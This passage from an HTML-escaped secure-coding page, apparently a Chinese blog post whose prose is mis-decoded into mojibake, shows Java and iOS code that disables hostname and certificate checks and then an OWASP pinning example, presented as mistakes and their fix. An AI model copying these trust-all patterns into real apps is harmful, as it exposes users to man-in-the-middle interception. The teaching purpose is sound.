&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æˆ–æ˜¯&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ä¸Šè¿°å¯«æ³•ç•¥éäº†æ†‘è­‰ä¸­çš„ hostname æª¢æŸ¥ï¼Œå°è‡´å³ä½¿é€£ç·šç«¯èˆ‡æ†‘è­‰ä¸­æŒ‡å®šçš„ hostname ä¸ä¸€è‡´ä¹Ÿèƒ½é€šéã€‚è¼ƒç‚ºæ°ç•¶çš„åšæ³•æ˜¯ä¸ç‰¹åˆ¥è¨­å®šï¼Œè®“ä»–ä½¿ç”¨é è¨­çš„ DefaultHostnameVerifierï¼Œæˆ–æ˜¯æ¡ç”¨æ›´ç‚ºåš´è¬¹çš„ StrictHostnameVerifierã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³1&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IgnoreSSL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æ­¤æƒ…æ³ä½¿ç”¨åˆ° Framework ä¸­çš„ Private APIï¼Œé›–ç„¶é€™ç¨®å¯«æ³•æœƒå› ç‚ºä¸èƒ½é€šé Apple çš„å¯©æŸ¥è€Œä¸æœƒå‡ºç¾åœ¨ AppStore ä¸Š(ä½¿ç”¨å›é¿æŠ€å·§ä¸åœ¨é€™è¨è«–ç¯„åœå…§)ï¼Œä½†ä»æœ‰æ©Ÿæœƒåœ¨ç„¡éœ€ç¶“é Apple å¯©æŸ¥çš„ Enterprise App ä¸­ä½¿ç”¨ã€‚è¼ƒç‚ºé©ç•¶çš„åšæ³•æ˜¯ç”¨ â€œ#if DEBUGâ€ï¼Œâ€#endifâ€ åŒ…èµ·ä¾†ä»¥ç¢ºä¿è©²æ®µç¨‹å¼åœ¨ç·¨è­¯æ™‚åªèƒ½å°é–‹ç™¼ä¸­çš„ debug ç‰ˆä¸Šæœ‰ä½œç”¨ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ios-éŒ¯èª¤è™•ç†æƒ…æ³2&quot;&gt;iOS éŒ¯èª¤è™•ç†æƒ…æ³2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ä¸Šé¢çš„åšæ³•æœƒè®“ä½¿ç”¨ NSURLConnection çš„é€£ç·šç•¥éæ†‘è­‰æª¢æŸ¥ï¼Œå®¹è¨±ä»»æ„æ†‘è­‰é€šéã€‚ä¸‹é¢ç¯€éŒ„ OWASP WIKI ä¸Šçš„ç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;random-org&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&quot;der&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                        &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
